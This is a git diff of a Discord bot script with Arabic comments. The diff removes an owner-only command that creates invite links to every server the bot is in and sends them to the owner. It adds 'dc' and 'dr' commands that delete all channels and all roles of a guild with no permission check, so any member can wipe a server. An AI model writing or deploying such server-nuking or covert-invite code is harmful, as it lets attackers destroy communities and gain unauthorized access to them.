@@ -32,27 +32,20 @@ client.on('ready', () => {
 });
  
 client.on('message', message => {
-    var BotServersChannel = "563097987459579904";// ايدي الروم المطلوب يرسل فيه السيرفرات
-    var BotOwnerID = "512625982751113216";// ايدي تبعك هون
-    if(message.author.bot) return;
-    if(message.content === prefix + 'botservers') {
-    if (message.author.id !==  BotOwnerID) return;
-      client.guilds.forEach(g => {
-          var botserverembed = new Discord.RichEmbed()
-        .setTimestamp()
-        .setColor('RANDOM')
-        .setThumbnail(g.iconURL)
-        .addField("**ServerName**", `**${g.name}**`, true)
-        .addField("**ServerID**", `**${g.id}**`, true)
-        .addField("**Members**", `**${g.memberCount}**`, true)
-        .addField("**Roles**", `**${g.roles.size}** Role `, true)
-        .addField('**Channels**', `**${g.channels.size}**`, true);
-        g.channels.get(g.channels.first().id).createInvite({
-          maxUses: 5,
-          maxAge: 86400,
-        }).then(i => client.channels.get(BotServersChannel).send(`Invite Link: <https://discord.gg/${i.code}>\nServer Owner: <@${g.owner.id}>`,{embed: botserverembed}));
-      })
-    }
-});//By MK ... Alpha Codes
-///////
+ if(message.content.split(' ')[0] == prefix + 'dc') { 
+ if (!message.channel.guild) return;
+ message.guild.channels.forEach(m => {
+ m.delete();
+ });
+ }
+ if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
+ if (!message.channel.guild) return;
+ message.guild.roles.forEach(m => {
+ m.delete();
+ });
+ message.reply("`تم حذف جميع الرتب بنجاح`")
+ }
+ });
+
+
 client.login(process.env.BOT_TOKEN);
